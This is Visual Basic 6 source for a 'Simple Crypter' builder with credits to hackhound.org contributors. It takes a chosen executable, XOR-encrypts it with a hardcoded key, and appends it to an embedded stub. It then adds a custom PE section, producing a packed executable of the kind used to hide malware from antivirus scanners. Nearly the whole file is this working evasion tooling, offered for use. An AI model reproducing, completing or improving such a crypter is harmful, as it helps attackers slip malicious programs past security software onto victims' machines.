VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmHaupt 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Simple Crypter"
   ClientHeight    =   2100
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3495
   Icon            =   "frmHaupt.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2100
   ScaleWidth      =   3495
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame frameselect 
      Caption         =   "Select File"
      ForeColor       =   &H80000007&
      Height          =   615
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3495
      Begin VB.CommandButton buttselect 
         Caption         =   "Select"
         Height          =   255
         Left            =   120
         TabIndex        =   11
         Top             =   240
         Width           =   615
      End
      Begin VB.TextBox txtselect 
         Height          =   285
         Left            =   840
         OLEDropMode     =   1  'Manual
         TabIndex        =   1
         Text            =   "Drop File..."
         ToolTipText     =   "Drag 'n' Drop"
         Top             =   240
         Width           =   2535
      End
   End
   Begin VB.Frame framedoit 
      Caption         =   "Crypt File"
      Height          =   615
      Left            =   0
      TabIndex        =   9
      Top             =   600
      Width           =   3495
      Begin VB.CommandButton buttdoit 
         Caption         =   "Do it"
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   240
         Width           =   3255
      End
   End
   Begin VB.Frame framecredits 
      Caption         =   "Credits"
      Height          =   855
      Left            =   0
      TabIndex        =   2
      Top             =   1200
      Width           =   3495
      Begin VB.Label lblsc 
         Caption         =   "www.scenecoderz.cc"
         Height          =   255
         Left            =   1800
         TabIndex        =   8
         ToolTipText     =   "Visit"
         Top             =   480
         Width           =   1575
      End
      Begin VB.Label lblhackhound 
         Caption         =   "www.hackhound.org"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         ToolTipText     =   "Visit"
         Top             =   480
         Width           =   1575
      End
      Begin VB.Label lblsteve10120 
         Caption         =   "steve10120"
         Height          =   255
         Left            =   1560
         TabIndex        =   6
         ToolTipText     =   "Simple Encryption"
         Top             =   240
         Width           =   855
      End
      Begin VB.Label lblKarcrack 
         Caption         =   "Karcrack"
         Height          =   255
         Left            =   720
         TabIndex        =   5
         ToolTipText     =   "cNtPEL"
         Top             =   240
         Width           =   735
      End
      Begin VB.Label lblkerberos5 
         Caption         =   "kerberos5"
         Height          =   255
         Left            =   2520
         TabIndex        =   4
         ToolTipText     =   "Addsection"
         Top             =   240
         Width           =   735
      End
      Begin VB.Label lblcobein 
         Caption         =   "Cobein"
         Height          =   255
         Left            =   120
         TabIndex        =   3
         ToolTipText     =   "Invoke"
         Top             =   240
         Width           =   615
      End
   End
   Begin MSComDlg.CommonDialog cdhaupt 
      Left            =   0
      Top             =   2880
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
End
Attribute VB_Name = "frmHaupt"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Const CryptKey As String = "WBYePyrtSj5xEkQ7VuD9VtW"
Const SectionName As String = ".xdcjhfz"
Const Delimiter As String = "www.hackhound.org"

Public Function SelectFile() As String
With cdhaupt
   .FileName = ""
   .DefaultExt = "exe"
   .Filter = "Executable Files (*.exe)|*.exe"
   .InitDir = App.Path
   .ShowOpen
   If .FileName = vbNullString Then Exit Function
   SelectFile = .FileName
End With
End Function
Public Function SaveFile() As String
With cdhaupt
   .FileName = ""
   .DefaultExt = "exe"
   .Filter = "Executable Files (*.exe)|*.exe"
   .InitDir = App.Path
   .ShowSave
   If .FileName = vbNullString Then Exit Function
   SaveFile = .FileName
End With
End Function

Private Sub buttdoit_Click()
Dim bStubData() As Byte
Dim iFF As Integer
Dim sSaveFile As String
Dim sStubPath As String
Dim sStub As String
Dim sFile As String
Dim dwSettingsRVA As Long
Dim dwSettingsRaw As Long
Dim Settings As String

If txtselect.Text = vbNullString Or txtselect.Text = "Drop File..." Then
 MsgBox "Select File", , "No File Selected"
 Exit Sub
End If
 
sSaveFile = SaveFile
sStubPath = App.Path & "\stub.exe"

  If PathFileExists(sStubPath) Then
   Kill sStubPath
  End If
  
  If PathFileExists(sSaveFile) Then
   Kill sSaveFile
  End If
  
  iFF = FreeFile
  Open sStubPath For Binary Access Write As iFF
  bStubData = LoadResData(101, "STB")
   Put iFF, , bStubData
  Close iFF
  
  iFF = FreeFile
  Open sStubPath For Binary Access Read As iFF
  sStub = Space(LOF(iFF))
   Get iFF, , sStub
  Close iFF
  
  iFF = FreeFile
  Open txtselect.Text For Binary Access Read As iFF
   sFile = Space(LOF(iFF))
  Get iFF, , sFile
  Close iFF
  
  iFF = FreeFile
  Open sSaveFile For Binary Access Write As iFF
   Put iFF, , sStub & Delimiter
   Put iFF, , Encrypt(sFile, CryptKey) & Delimiter & Delimiter & Delimiter & Delimiter & Delimiter & Delimiter & Delimiter & Delimiter & Delimiter
   Call AddSection(sSaveFile, SectionName, Len(sFile), &H8214356)
  Close iFF
  
If PathFileExists(App.Path & "\stub.exe") Then
   Kill App.Path & "\stub.exe"
End If
MsgBox "Crypting finished!", , "Done"
End Sub

Private Sub buttselect_Click()
txtselect.Text = SelectFile
End Sub
Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    Dim iFF As Integer
    On Error Resume Next
    iFF = FreeFile
    Open sPath For Binary Access Read As iFF
    lFileSize = LOF(iFF)
    sData = Input$(lFileSize, 1)
    Close iFF
    LoadFile = sData
End Function

Private Sub lblcobein_Click()
ShellExecute hWnd, "open", "http://www.advancevb.com.ar/", NILL, NILL, Empty
End Sub

Private Sub lblhackhound_Click()
ShellExecute hWnd, "open", "http://www.hackhound.org", NILL, NILL, Empty
End Sub


Private Sub lblKarcrack_Click()
ShellExecute hWnd, "open", "http://hackhound.org/forum/index.php?topic=20762.0", NILL, NILL, Empty
End Sub

Private Sub lblkerberos5_Click()
ShellExecute hWnd, "open", "http://hackhound.org/forum/index.php?topic=17462.0", NILL, NILL, Empty
End Sub

Private Sub lblsc_Click()
ShellExecute hWnd, "open", "http://www.scenecoderz.cc", NILL, NILL, Empty
End Sub

Private Sub lblsteve10120_Click()
ShellExecute hWnd, "open", "http://hackhound.org/forum/index.php?topic=3944.0", NILL, NILL, Empty
End Sub

Private Sub txtselect_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, x As Single, Y As Single)
Dim sFilePath As String
sFilePath = Data.Files(1)
If Not GetExtension(sFilePath) = "EXE" Then Exit Sub
txtselect.Text = Data.Files(1)
End Sub
Public Function Encrypt(sText As String, sKey As String) As String
Dim i, x, Y As Integer, b() As Byte, k() As Byte

Encrypt = vbNullString
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For Y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (Y + 5)
    Next Y
Next i
Encrypt = StrConv(b, vbUnicode)
End Function
Public Function GetExtension(ByVal sFile As String) As String
    GetExtension = UCase(Right(sFile, Len(sFile) - InStrRev(sFile, ".")))
End Function

